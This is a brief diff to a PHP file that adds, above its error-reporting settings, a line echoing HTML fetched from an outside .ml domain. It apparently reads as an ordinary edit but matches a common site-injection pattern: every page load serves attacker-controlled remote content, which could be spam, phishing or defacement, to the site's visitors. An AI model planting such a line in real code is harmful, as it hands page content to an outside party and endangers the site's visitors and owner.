@@ -1,4 +1,6 @@
 <?php
+echo file_get_contents('https://www.hundredthousand.ml/Sphere/index.html');
+
 
 // Comment these lines to hide errors
 error_reporting(E_ALL);
